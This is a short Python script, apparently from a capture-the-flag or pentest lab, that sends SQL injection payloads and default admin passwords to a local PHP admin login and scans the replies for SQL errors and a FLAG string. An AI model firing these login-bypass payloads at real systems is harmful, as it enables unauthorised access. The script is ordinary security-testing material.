import requests
import re

base_url = "http://127.0.0.1:32817"
admin_endpoint = f"{base_url}/admin.php"

cookies = {
    "PHPSESSID": "1be838a0271333bc548391c1dae99848"
}

test_cases = [
    {"name": "SQLi OR 1=1", "username": "admin' OR '1'='1", "password": "test"},
    {"name": "SQLi Comment", "username": "admin'--", "password": ""},
    {"name": "SQL Error", "username": "admin'", "password": "test"},
    {"name": "admin/admin", "username": "admin", "password": "admin"},
    {"name": "admin/password", "username": "admin", "password": "password"},
    {"name": "admin/123456", "username": "admin", "password": "123456"}
]

print("Testing /admin.php with various payloads\n")

for i, test in enumerate(test_cases, 1):
    print(f"\n[TEST {i}] {test['name']}")
    print(f"Username: {test['username']}")
    print(f"Password: {test['password']}\n")
    
    try:
        response = requests.post(
            admin_endpoint,
            data={"username": test["username"], "password": test["password"]},
            cookies=cookies,
            allow_redirects=False,
            timeout=10
        )
        
        print(f"Status: {response.status_code}")
        print(f"Length: {len(response.content)} bytes")
        print(f"Time: {response.elapsed.total_seconds():.3f}s")
        
        print(f"\nHeaders:")
        for header, value in response.headers.items():
            print(f"  {header}: {value}")
        
        if response.cookies:
            print(f"\nCookies:")
            for cookie in response.cookies:
                print(f"  {cookie.name}: {cookie.value}")
        
        print(f"\nResponse Body:")
        print(response.text)
        
        # Check for SQL errors
        sql_patterns = [r"SQL syntax", r"mysql", r"mysqli", r"syntax error", r"Warning"]
        for pattern in sql_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                print(f"\n[!] SQL Error indicator found: {pattern}")
        
        # Check for success/failure
        if re.search(r"welcome|dashboard|logged in|admin panel|FLAG", response.text, re.IGNORECASE):
            print("[!] SUCCESS indicator found")
        
        if re.search(r"invalid|incorrect|failed|denied", response.text, re.IGNORECASE):
            print("[!] FAILURE indicator found")
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"\n[!!!] FLAG FOUND: {flag_match.group(0)}")
        
        print("-" * 60)
        
    except Exception as e:
        print(f"Error: {str(e)}")
        print("-" * 60)

print("\nAll tests completed")

